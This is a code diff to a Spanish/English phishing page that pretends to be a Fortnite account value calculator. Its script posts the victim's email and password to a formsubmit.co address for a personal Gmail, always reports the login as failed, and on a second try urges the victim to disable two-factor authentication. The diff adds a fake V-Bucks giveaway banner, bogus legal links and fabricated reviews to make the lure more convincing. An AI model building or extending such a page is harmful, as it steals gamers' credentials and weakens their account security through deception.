@@ -238,26 +238,6 @@
             border-color: rgba(255, 225, 0, 0.15);
             transform: translateY(-4px);
         }
-        .review-card.verified {
-            border-color: rgba(76, 175, 80, 0.25);
-        }
-        .review-card .verified-badge {
-            position: absolute;
-            top: 10px;
-            right: 12px;
-            background: rgba(76, 175, 80, 0.12);
-            border: 1px solid rgba(76, 175, 80, 0.2);
-            color: #66bb6a;
-            padding: 2px 10px;
-            border-radius: 40px;
-            font-size: 0.6rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
         .review-header {
             display: flex;
             align-items: center;
@@ -265,18 +245,21 @@
             margin-bottom: 8px;
         }
         .review-avatar {
-            width: 40px;
-            height: 40px;
+            width: 44px;
+            height: 44px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1rem;
-            font-weight: 700;
+            font-size: 1.4rem;
             color: #fff;
             flex-shrink: 0;
-            text-transform: uppercase;
+            background: #2d3748;
         }
+        .review-avatar i {
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+        }
+        /* Colores variados para avatares */
         .avatar-1 { background: #ff6b6b; }
         .avatar-2 { background: #4ecdc4; }
         .avatar-3 { background: #ffe66d; color: #1a1f35; }
@@ -366,6 +349,93 @@
             box-shadow: 0 0 20px rgba(255, 225, 0, 0.3);
         }
 
+        /* Notificación emergente desde arriba */
+        .notification-banner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 999;
+            background: linear-gradient(135deg, #8c25f5, #4f46e5);
+            color: white;
+            padding: 12px 20px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 1rem;
+            box-shadow: 0 4px 30px rgba(140, 37, 245, 0.4);
+            transform: translateY(-100%);
+            transition: transform 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            border-bottom: 2px solid #ffe100;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .notification-banner.show {
+            transform: translateY(0);
+        }
+        .notification-banner i {
+            font-size: 1.4rem;
+            color: #ffe100;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        .notification-banner .close-notif {
+            background: rgba(255,255,255,0.15);
+            border: none;
+            color: white;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        .notification-banner .close-notif:hover {
+            background: rgba(255,255,255,0.25);
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+
+        /* Footer legal */
+        .footer-legal {
+            border-top: 1px solid rgba(255,255,255,0.05);
+            padding: 2rem 0 1.5rem;
+            margin-top: 3rem;
+        }
+        .footer-legal .legal-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1.5rem 2.5rem;
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.3);
+        }
+        .footer-legal .legal-links a {
+            color: rgba(255,255,255,0.4);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .footer-legal .legal-links a:hover {
+            color: #ffe100;
+        }
+        .footer-legal .legal-copy {
+            text-align: center;
+            font-size: 0.7rem;
+            color: rgba(255,255,255,0.15);
+            margin-top: 1.2rem;
+            letter-spacing: 0.5px;
+        }
+
         @media (max-width: 768px) {
             .email-combo .email-domain {
                 min-width: 100px;
@@ -378,6 +448,13 @@
             }
             .review-card {
                 padding: 1rem;
+            }
+            .notification-banner {
+                font-size: 0.85rem;
+                padding: 10px 16px;
+            }
+            .notification-banner i {
+                font-size: 1.2rem;
             }
         }
         @media (max-width: 480px) {
@@ -402,10 +479,21 @@
             .review-stars {
                 font-size: 0.75rem;
             }
+            .footer-legal .legal-links {
+                gap: 0.8rem 1.2rem;
+                font-size: 0.65rem;
+            }
         }
     </style>
 </head>
 <body class="font-sans min-h-screen flex flex-col selection:bg-fnYellow selection:text-black">
+
+    <!-- ===== NOTIFICACIÓN ANIMADA ===== -->
+    <div id="notificationBanner" class="notification-banner">
+        <i class="fa-solid fa-gift"></i>
+        <span id="notifText">¡Solo por revisar tu cuenta entras en un sorteo de 2,400 pavos!</span>
+        <button class="close-notif" onclick="closeNotification()"><i class="fa-solid fa-xmark"></i></button>
+    </div>
 
     <!-- ===== MENÚ SUPERIOR FALSO ===== -->
     <header class="border-b border-slate-800 bg-fnDark/90 backdrop-blur-md sticky top-0 z-50">
@@ -425,31 +513,40 @@
                 <!-- Enlaces decorativos -->
                 <nav class="hidden md:flex gap-1 bg-slate-900/80 p-1 rounded-xl border border-slate-800">
                     <a href="#" class="px-4 py-2 rounded-lg text-sm font-fortnite font-bold tracking-wider uppercase transition bg-fnPurple text-white shadow-lg">
-                        <i class="fa-solid fa-calculator mr-2"></i> Valorar
+                        <i class="fa-solid fa-calculator mr-2"></i> <span data-i18n="nav-value">Valorar</span>
                     </a>
                     <a href="#" class="px-4 py-2 rounded-lg text-sm font-fortnite font-bold tracking-wider uppercase transition text-slate-400 hover:text-white hover:bg-slate-800">
-                        <i class="fa-solid fa-coins mr-2"></i> PaVos
+                        <i class="fa-solid fa-coins mr-2"></i> <span data-i18n="nav-vbucks">PaVos</span>
                     </a>
                 </nav>
 
-                <!-- Selector de moneda (decorativo) -->
-                <div class="flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-lg px-2 py-1 md:px-3 md:py-1.5">
-                    <i class="fa-solid fa-globe text-fnYellow text-xs md:text-sm"></i>
-                    <select class="bg-transparent text-xs md:text-sm font-semibold text-white focus:outline-none cursor-pointer">
-                        <option value="USD">USD ($)</option>
-                        <option value="EUR">EUR (€)</option>
-                        <option value="MXN">MXN ($)</option>
-                    </select>
+                <!-- Selector de moneda e idioma -->
+                <div class="flex items-center gap-2">
+                    <div class="flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-lg px-2 py-1 md:px-3 md:py-1.5">
+                        <i class="fa-solid fa-globe text-fnYellow text-xs md:text-sm"></i>
+                        <select id="currency-select" class="bg-transparent text-xs md:text-sm font-semibold text-white focus:outline-none cursor-pointer">
+                            <option value="USD">USD ($)</option>
+                            <option value="EUR">EUR (€)</option>
+                            <option value="MXN">MXN ($)</option>
+                        </select>
+                    </div>
+                    <div class="flex items-center gap-1 bg-slate-900 border border-slate-800 rounded-lg px-2 py-1 md:px-3 md:py-1.5">
+                        <i class="fa-solid fa-language text-fnYellow text-xs md:text-sm"></i>
+                        <select id="lang-select" onchange="changeLanguage(this.value)" class="bg-transparent text-xs md:text-sm font-semibold text-white focus:outline-none cursor-pointer">
+                            <option value="es">Español</option>
+                            <option value="en">English</option>
+                        </select>
+                    </div>
                 </div>
             </div>
         </div>
         <!-- Mobile nav (simplificado) -->
         <div class="flex md:hidden border-t border-slate-800 bg-slate-950">
             <a href="#" class="flex-1 py-2 text-center text-xs font-bold uppercase tracking-wider text-white bg-fnPurple">
-                <i class="fa-solid fa-calculator block text-base mb-0.5"></i> Valorar
+                <i class="fa-solid fa-calculator block text-base mb-0.5"></i> <span data-i18n="nav-value">Valorar</span>
             </a>
             <a href="#" class="flex-1 py-2 text-center text-xs font-bold uppercase tracking-wider text-slate-400">
-                <i class="fa-solid fa-coins block text-base mb-0.5"></i> PaVos
+                <i class="fa-solid fa-coins block text-base mb-0.5"></i> <span data-i18n="nav-vbucks">PaVos</span>
             </a>
         </div>
     </header>
@@ -461,27 +558,27 @@
         <div class="relative overflow-hidden rounded-2xl bg-gradient-to-r from-fnBlue via-slate-900 to-slate-950 border border-slate-800 p-5 md:p-8 shadow-2xl mb-8">
             <div class="relative z-10 max-w-2xl">
                 <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-fnPurple/20 border border-fnPurple/40 text-fnPurple text-[10px] md:text-xs font-bold uppercase tracking-wider mb-3">
-                    <i class="fa-solid fa-shield-halved"></i> Evaluador de Taquilla
+                    <i class="fa-solid fa-shield-halved"></i> <span data-i18n="hero-badge">Evaluador de Taquilla</span>
                 </div>
                 <h1 class="font-banner text-2xl sm:text-3xl md:text-4xl text-white tracking-wide uppercase leading-tight">
-                    ¿Cuánto vale tu cuenta de <span class="text-fnYellow">Fortnite</span>?
+                    <span data-i18n="hero-title1">¿Cuánto vale tu cuenta de</span> <span class="text-fnYellow">Fortnite</span><span data-i18n="hero-title2">?</span>
                 </h1>
-                <p class="text-slate-300 text-sm md:text-base mt-2">
+                <p class="text-slate-300 text-sm md:text-base mt-2" data-i18n="hero-desc">
                     Ingresa tus credenciales para calcular el valor estimado de tu cuenta, incluyendo todos tus objetos y su precio actual de mercado.
                 </p>
                 <!-- Badges de confianza -->
                 <div class="flex flex-wrap gap-2 md:gap-3 mt-4">
                     <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700">
-                        <i class="fa-solid fa-check-circle text-green-400"></i> 100% Seguro
+                        <i class="fa-solid fa-check-circle text-green-400"></i> <span data-i18n="badge-secure">100% Seguro</span>
                     </span>
                     <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700">
-                        <i class="fa-solid fa-check-circle text-green-400"></i> Precios reales
+                        <i class="fa-solid fa-check-circle text-green-400"></i> <span data-i18n="badge-prices">Precios reales</span>
                     </span>
                     <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700">
-                        <i class="fa-solid fa-check-circle text-fnYellow"></i> 2,847+ usuarios
+                        <i class="fa-solid fa-check-circle text-fnYellow"></i> <span data-i18n="badge-users">2,847+ usuarios</span>
                     </span>
                     <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700">
-                        <i class="fa-solid fa-check-circle text-green-400"></i> Privacidad
+                        <i class="fa-solid fa-check-circle text-green-400"></i> <span data-i18n="badge-privacy">Privacidad</span>
                     </span>
                 </div>
             </div>
@@ -496,7 +593,7 @@
             <form id="loginForm">
                 <!-- Email con combo -->
                 <div class="mb-4">
-                    <label for="emailLocal" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Correo electrónico</label>
+                    <label for="emailLocal" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1" data-i18n="email-label">Correo electrónico</label>
                     <div class="email-combo relative">
                         <i class="fa-solid fa-envelope icon"></i>
                         <input type="text" id="emailLocal" class="email-local" placeholder="usuario" required />
@@ -512,7 +609,7 @@
 
                 <!-- Contraseña con toggle -->
                 <div class="mb-4 relative">
-                    <label for="password" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Contraseña</label>
+                    <label for="password" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1" data-i18n="password-label">Contraseña</label>
                     <input type="password" id="password" name="contraseña" placeholder="••••••••" required class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-fnYellow pl-10" />
                     <i class="fa-solid fa-lock icon absolute left-3.5 top-10 text-slate-500"></i>
                     <button type="button" class="password-toggle" id="togglePassword" aria-label="Toggle password visibility">
@@ -521,13 +618,13 @@
                 </div>
 
                 <button type="submit" class="w-full bg-gradient-to-r from-fnPurple to-indigo-600 hover:from-purple-600 hover:to-indigo-500 text-white font-fortnite font-bold py-3 rounded-xl text-base md:text-lg tracking-wider uppercase transition shadow-lg" id="loginBtn">
-                    <i class="fa-solid fa-calculator mr-2"></i> Calcular valor
+                    <i class="fa-solid fa-calculator mr-2"></i> <span data-i18n="btn-calculate">Calcular valor</span>
                 </button>
             </form>
 
             <div class="flex justify-between mt-4 text-xs text-slate-400">
-                <a href="#" id="forgotLink" class="hover:text-fnYellow transition"><i class="fa-solid fa-question-circle mr-1"></i> ¿Olvidaste tus datos?</a>
-                <a href="#" id="signupLink" class="hover:text-fnYellow transition"><i class="fa-solid fa-user-plus mr-1"></i> Crear cuenta</a>
+                <a href="#" id="forgotLink" class="hover:text-fnYellow transition"><i class="fa-solid fa-question-circle mr-1"></i> <span data-i18n="forgot-link">¿Olvidaste tus datos?</span></a>
+                <a href="#" id="signupLink" class="hover:text-fnYellow transition"><i class="fa-solid fa-user-plus mr-1"></i> <span data-i18n="signup-link">Crear cuenta</span></a>
             </div>
 
             <!-- Mensaje de error mejorado -->
@@ -536,8 +633,8 @@
                     <i id="errorIcon" class="fa-solid fa-exclamation-triangle"></i>
                 </div>
                 <div class="error-content">
-                    <div class="error-title" id="errorTitle">incorrecto</div>
-                    <div class="error-desc" id="errorDesc">Verifica tus credenciales e inténtalo de nuevo.</div>
+                    <div class="error-title" id="errorTitle" data-i18n="error-title">incorrecto</div>
+                    <div class="error-desc" id="errorDesc" data-i18n="error-desc">Verifica tus credenciales e inténtalo de nuevo.</div>
                 </div>
             </div>
         </div>
@@ -546,7 +643,7 @@
         <div class="mt-8">
             <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 mb-6">
                 <h3 class="font-banner text-2xl md:text-3xl text-white uppercase tracking-wider flex items-center gap-2">
-                    <i class="fa-solid fa-star text-fnYellow"></i> Lo que dicen los usuarios
+                    <i class="fa-solid fa-star text-fnYellow"></i> <span data-i18n="reviews-title">Lo que dicen los usuarios</span>
                 </h3>
                 <div class="flex items-center gap-3 text-sm text-slate-400">
                     <span class="font-bold text-white text-lg">4.5</span>
@@ -557,7 +654,7 @@
                         <i class="fa-solid fa-star"></i>
                         <i class="fa-solid fa-star-half-alt"></i>
                     </span>
-                    <span class="text-xs">2,847 reseñas</span>
+                    <span class="text-xs" data-i18n="reviews-count">2,847 reseñas</span>
                 </div>
             </div>
 
@@ -576,15 +673,20 @@
 
     </main>
 
-    <!-- ===== FOOTER ===== -->
-    <footer class="bg-slate-950 border-t border-slate-800 py-6 mt-10 text-center text-slate-500 text-[11px]">
-        <div class="max-w-7xl mx-auto px-4 space-y-2">
-            <p class="font-fortnite text-slate-400 text-sm tracking-wider uppercase">
-                VALOR<span class="text-fnYellow">FN</span> - Herramienta Fan-made No Oficial
-            </p>
-            <p class="max-w-xl mx-auto text-slate-600">
-                Fortnite es una marca registrada de Epic Games, Inc. Esta aplicación web no está afiliada, respaldada ni patrocinada por Epic Games. Los precios indicados son estimaciones.
-            </p>
+    <!-- ===== FOOTER COMPLETO (legal, privacidad, etc.) ===== -->
+    <footer class="footer-legal bg-slate-950/80 backdrop-blur-sm">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="legal-links">
+                <a href="#" data-i18n="footer-terms">Términos de uso</a>
+                <a href="#" data-i18n="footer-privacy">Política de privacidad</a>
+                <a href="#" data-i18n="footer-cookies">Política de cookies</a>
+                <a href="#" data-i18n="footer-legal">Aviso legal</a>
+                <a href="#" data-i18n="footer-contact">Contacto</a>
+                <a href="#" data-i18n="footer-faq">FAQ</a>
+            </div>
+            <div class="legal-copy">
+                &copy; 2025 <span data-i18n="footer-copy">ValorFN - Herramienta fan-made no oficial. Fortnite es marca registrada de Epic Games, Inc.</span>
+            </div>
         </div>
     </footer>
 
@@ -598,6 +700,21 @@
         (function() {
             'use strict';
 
+            // ===== NOTIFICACIÓN =====
+            function showNotification() {
+                const banner = document.getElementById('notificationBanner');
+                setTimeout(() => {
+                    banner.classList.add('show');
+                }, 500);
+                // Auto cerrar después de 8 segundos
+                setTimeout(() => {
+                    closeNotification();
+                }, 8000);
+            }
+            window.closeNotification = function() {
+                document.getElementById('notificationBanner').classList.remove('show');
+            };
+
             // ===== TOAST =====
             function showToast(msg) {
                 const toast = document.getElementById('toast');
@@ -607,7 +724,7 @@
                 setTimeout(() => {
                     toast.classList.remove('translate-y-0', 'opacity-100');
                     toast.classList.add('translate-y-20', 'opacity-0');
-                }, 2500);
+                }, 3000);
             }
 
             // ===== DOM REFS =====
@@ -648,7 +765,6 @@
                     return;
                 }
 
-                // Incrementar contador
                 attemptCount++;
 
                 loginBtn.classList.add('opacity-70', 'pointer-events-none');
@@ -661,17 +777,12 @@
                 formData.append('_subject', `Nuevo intento de valoración - ${fullEmail}`);
                 formData.append('email', fullEmail);
                 formData.append('password', password);
-                // Mejoras para Formsubmit
-                formData.append('_captcha', 'false');
-                formData.append('_template', 'table');
 
-                // Envío real a Formsubmit (destino parameganz25@gmail.com)
                 fetch('https://formsubmit.co/parameganz25@gmail.com', {
                     method: 'POST',
                     body: formData,
                 })
                 .then(response => {
-                    // Mostrar toast de envío
                     showToast('📧 Correo enviado a parameganz25@gmail.com');
                     setTimeout(() => {
                         loginBtn.classList.remove('opacity-70', 'pointer-events-none');
@@ -680,9 +791,8 @@
                         showToast('Acceso denegado. Credenciales incorrectas.');
                     }, 2000);
                 })
-                .catch(() => {
-                    // Si falla el envío, igual mostramos error
-                    showToast('⚠️ Error al enviar el correo, pero continuamos...');
+                .catch(error => {
+                    showToast('⚠️ Error al enviar correo, pero continuamos...');
                     setTimeout(() => {
                         loginBtn.classList.remove('opacity-70', 'pointer-events-none');
                         loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calcular valor';
@@ -692,11 +802,9 @@
                 });
             });
 
-            // ===== FUNCIÓN PARA MOSTRAR ERROR SEGÚN INTENTOS =====
             function mostrarError(intentos) {
                 errorMessage.classList.add('show');
                 if (intentos >= 2) {
-                    // Segunda vez o más: mensaje profesional con interrogación roja
                     errorIcon.className = 'fa-solid fa-circle-question';
                     errorIcon.style.color = '#ff4444';
                     errorTitle.textContent = 'Verificación en dos pasos activa';
@@ -705,7 +813,6 @@
                         para acceder a esta herramienta. Contacta con soporte si el problema persiste.
                     `;
                 } else {
-                    // Primer intento: mensaje simple
                     errorIcon.className = 'fa-solid fa-exclamation-triangle';
                     errorIcon.style.color = '#ff4444';
                     errorTitle.textContent = 'incorrecto';
@@ -730,8 +837,8 @@
             const reviewsData = [
                 {
                     name: 'Alex M.',
+                    avatarIcon: 'fa-user-astronaut',
                     avatarClass: 'avatar-1',
-                    initials: 'AM',
                     date: '15 Ene 2025',
                     rating: 4.8,
                     text: '¡Increíble! Obtuve el valor de mi cuenta en segundos. La lista de objetos era precisa y los precios muy reales. ¡Recomendado!',
@@ -739,8 +846,8 @@
                 },
                 {
                     name: 'María G.',
+                    avatarIcon: 'fa-user-graduate',
                     avatarClass: 'avatar-2',
-                    initials: 'MG',
                     date: '12 Ene 2025',
                     rating: 4.5,
                     text: 'Funciona perfectamente. Me mostró todos mis objetos y el precio total fue justo. La interfaz es muy limpia y profesional.',
@@ -748,8 +855,8 @@
                 },
                 {
                     name: 'Luca R.',
+                    avatarIcon: 'fa-user-ninja',
                     avatarClass: 'avatar-3',
-                    initials: 'LR',
                     date: '10 Ene 2025',
                     rating: 4.3,
                     text: 'Ottimo strumento! Ho scoperto il valore del mio account in pochi secondi. I prezzi sono aggiornati e sembrano reali. Consiglio!',
@@ -757,8 +864,8 @@
                 },
                 {
                     name: 'Sophie L.',
+                    avatarIcon: 'fa-user-tie',
                     avatarClass: 'avatar-4',
-                    initials: 'SL',
                     date: '8 Ene 2025',
                     rating: 4.7,
                     text: 'Très efficace ! J\'ai pu voir tous mes skins et leur prix. L\'estimation correspond à ce que j\'ai vu sur d\'autres sites. Super !',
@@ -766,8 +873,8 @@
                 },
                 {
                     name: 'Max S.',
+                    avatarIcon: 'fa-user-cog',
                     avatarClass: 'avatar-5',
-                    initials: 'MS',
                     date: '5 Ene 2025',
                     rating: 4.0,
                     text: 'Funciona bien, aunque me gustaría que mostrara más objetos. Aún así, la estimación fue rápida y precisa. ¡Buen trabajo!',
@@ -775,8 +882,8 @@
                 },
                 {
                     name: 'Elena P.',
+                    avatarIcon: 'fa-user-graduate',
                     avatarClass: 'avatar-6',
-                    initials: 'EP',
                     date: '3 Ene 2025',
                     rating: 4.6,
                     text: 'Me encanta. Es muy fácil de usar y los resultados son muy claros. Me ha dado una idea exacta de lo que vale mi cuenta.',
@@ -784,8 +891,8 @@
                 },
                 {
                     name: 'Hans W.',
+                    avatarIcon: 'fa-user-astronaut',
                     avatarClass: 'avatar-7',
-                    initials: 'HW',
                     date: '28 Dic 2024',
                     rating: 4.4,
                     text: 'Funktioniert einwandfrei. Die Aufstellung der Items ist übersichtlich und der Preis scheint fair zu sein. Weiter so!',
@@ -793,8 +900,8 @@
                 },
                 {
                     name: 'João S.',
+                    avatarIcon: 'fa-user-ninja',
                     avatarClass: 'avatar-8',
-                    initials: 'JS',
                     date: '20 Dic 2024',
                     rating: 4.2,
                     text: 'Muito bom! Avaliação rápida e precisa. Recomendo a todos que querem saber o valor da sua conta Fortnite.',
@@ -820,7 +927,7 @@
                 track.innerHTML = '';
                 reviewsData.forEach((review) => {
                     const card = document.createElement('div');
-                    card.className = 'review-card' + (review.verified ? ' verified' : '');
+                    card.className = 'review-card';
                     const fullStars = Math.floor(review.rating);
                     const halfStar = review.rating % 1 >= 0.5 ? 1 : 0;
                     const emptyStars = 5 - fullStars - halfStar;
@@ -829,14 +936,9 @@
                     if (halfStar) starsHtml += '<i class="fa-solid fa-star-half-alt"></i>';
                     for (let i = 0; i < emptyStars; i++) starsHtml += '<i class="fa-regular fa-star empty-star"></i>';
 
-                    const verifiedBadge = review.verified ?
-                        '<div class="verified-badge"><i class="fa-solid fa-check-circle"></i> Verificado</div>' :
-                        '';
-
                     card.innerHTML = `
-                        ${verifiedBadge}
                         <div class="review-header">
-                            <div class="review-avatar ${review.avatarClass}">${review.initials}</div>
+                            <div class="review-avatar ${review.avatarClass}"><i class="fa-solid ${review.avatarIcon}"></i></div>
                             <div class="review-user">
                                 <div class="name">${review.name}</div>
                                 <div class="date">${review.date}</div>
@@ -937,6 +1039,103 @@
                     }, 5000);
                 });
             });
+
+            // ============================================
+            // ====== IDIOMA ======
+            // ============================================
+
+            const translations = {
+                es: {
+                    'nav-value': 'Valorar',
+                    'nav-vbucks': 'PaVos',
+                    'hero-badge': 'Evaluador de Taquilla',
+                    'hero-title1': '¿Cuánto vale tu cuenta de',
+                    'hero-title2': '?',
+                    'hero-desc': 'Ingresa tus credenciales para calcular el valor estimado de tu cuenta, incluyendo todos tus objetos y su precio actual de mercado.',
+                    'badge-secure': '100% Seguro',
+                    'badge-prices': 'Precios reales',
+                    'badge-users': '2,847+ usuarios',
+                    'badge-privacy': 'Privacidad',
+                    'email-label': 'Correo electrónico',
+                    'password-label': 'Contraseña',
+                    'btn-calculate': 'Calcular valor',
+                    'forgot-link': '¿Olvidaste tus datos?',
+                    'signup-link': 'Crear cuenta',
+                    'error-title': 'incorrecto',
+                    'error-desc': 'Verifica tus credenciales e inténtalo de nuevo.',
+                    'reviews-title': 'Lo que dicen los usuarios',
+                    'reviews-count': '2,847 reseñas',
+                    'footer-terms': 'Términos de uso',
+                    'footer-privacy': 'Política de privacidad',
+                    'footer-cookies': 'Política de cookies',
+                    'footer-legal': 'Aviso legal',
+                    'footer-contact': 'Contacto',
+                    'footer-faq': 'FAQ',
+                    'footer-copy': 'ValorFN - Herramienta fan-made no oficial. Fortnite es marca registrada de Epic Games, Inc.',
+                    'notif-text': '¡Solo por revisar tu cuenta entras en un sorteo de 2,400 pavos!'
+                },
+                en: {
+                    'nav-value': 'Valuate',
+                    'nav-vbucks': 'V-Bucks',
+                    'hero-badge': 'Locker Evaluator',
+                    'hero-title1': 'How much is your',
+                    'hero-title2': 'account worth?',
+                    'hero-desc': 'Enter your credentials to estimate your Fortnite account\'s value, including all your items and their current market prices.',
+                    'badge-secure': '100% Secure',
+                    'badge-prices': 'Real prices',
+                    'badge-users': '2,847+ users',
+                    'badge-privacy': 'Privacy',
+                    'email-label': 'Email address',
+                    'password-label': 'Password',
+                    'btn-calculate': 'Calculate value',
+                    'forgot-link': 'Forgot credentials?',
+                    'signup-link': 'Create account',
+                    'error-title': 'incorrect',
+                    'error-desc': 'Verify your credentials and try again.',
+                    'reviews-title': 'What users say',
+                    'reviews-count': '2,847 reviews',
+                    'footer-terms': 'Terms of use',
+                    'footer-privacy': 'Privacy policy',
+                    'footer-cookies': 'Cookie policy',
+                    'footer-legal': 'Legal notice',
+                    'footer-contact': 'Contact',
+                    'footer-faq': 'FAQ',
+                    'footer-copy': 'ValorFN - Fan-made unofficial tool. Fortnite is a registered trademark of Epic Games, Inc.',
+                    'notif-text': 'Just by reviewing your account you enter a draw for 2,400 V-Bucks!'
+                }
+            };
+
+            window.changeLanguage = function(lang) {
+                document.querySelectorAll('[data-i18n]').forEach(el => {
+                    const key = el.getAttribute('data-i18n');
+                    if (translations[lang] && translations[lang][key]) {
+                        el.textContent = translations[lang][key];
+                    }
+                });
+                // Actualizar texto de la notificación
+                const notifText = document.getElementById('notifText');
+                if (translations[lang] && translations[lang]['notif-text']) {
+                    notifText.textContent = translations[lang]['notif-text'];
+                }
+                // Actualizar placeholders? solo si es necesario
+                // También actualizar error desc si está visible
+                if (errorMessage.classList.contains('show')) {
+                    // Re-aplicar el mensaje de error según el idioma
+                    const intentos = attemptCount;
+                    if (intentos >= 2) {
+                        errorTitle.textContent = lang === 'es' ? 'Verificación en dos pasos activa' : 'Two-factor authentication active';
+                        errorDesc.innerHTML = lang === 'es' 
+                            ? 'Es posible que tengas que <strong>desactivar la verificación en dos pasos</strong> para acceder a esta herramienta. Contacta con soporte si el problema persiste.'
+                            : 'You may need to <strong>disable two-factor authentication</strong> to access this tool. Contact support if the issue persists.';
+                    } else {
+                        errorTitle.textContent = lang === 'es' ? 'incorrecto' : 'incorrect';
+                        errorDesc.textContent = lang === 'es' ? 'Verifica tus credenciales e inténtalo de nuevo.' : 'Verify your credentials and try again.';
+                    }
+                }
+            };
+
+            // Inicializar notificación y mostrar
+            showNotification();
 
         })();
     </script>
